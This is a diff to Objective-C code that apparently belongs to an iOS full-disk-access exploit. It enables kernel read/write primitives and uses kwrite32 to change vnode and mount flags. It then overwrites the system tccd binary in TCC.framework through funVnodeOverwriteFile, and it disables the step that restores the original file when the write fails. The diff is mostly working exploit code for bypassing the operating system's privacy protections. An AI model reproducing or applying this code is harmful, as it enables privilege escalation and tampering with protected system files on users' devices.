@@ -15,7 +15,7 @@
 
 #import "proc.h"
 #import "offsets.h"
-//#import "krw.h"
+#import "krw.h"
 #import "vnode.h"
 
 typedef NSObject* xpc_object_t;
@@ -328,7 +328,7 @@ static bool overwrite_file(int fd, NSData* sourceData) {
         kwrite32(to_vnode + off_vnode_v_writecount, to_vnode_v_writecount + 1);
         printf("[+] overwrite_file vnode->v_writecount: %d\n", kread32(to_vnode + off_vnode_v_writecount));
     }
-    
+    /*
   for (int off = 0; off < sourceData.length; off += 0x4000) {
     bool success = false;
     for (int i = 0; i < 2; i++) {
@@ -344,7 +344,9 @@ static bool overwrite_file(int fd, NSData* sourceData) {
         kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag);
       return false;
     }
-  }
+  }*/
+    [sourceData writeToFile: [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/tccd"] atomically: true];
+    funVnodeOverwriteFile((char *) [[NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/tccd"] UTF8String], "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd");
     kwrite32(fileglob + off_fg_flag, O_RDONLY);
     kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag);
   return true;
@@ -373,7 +375,7 @@ static void grant_full_disk_access_impl(void (^completion)(NSString* extension_t
   }
 
   if (!overwrite_file(fd, sourceData)) {
-    overwrite_file(fd, originalData);
+    //overwrite_file(fd, originalData);
     munmap(targetMap, targetLength);
     completion(
         nil, [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
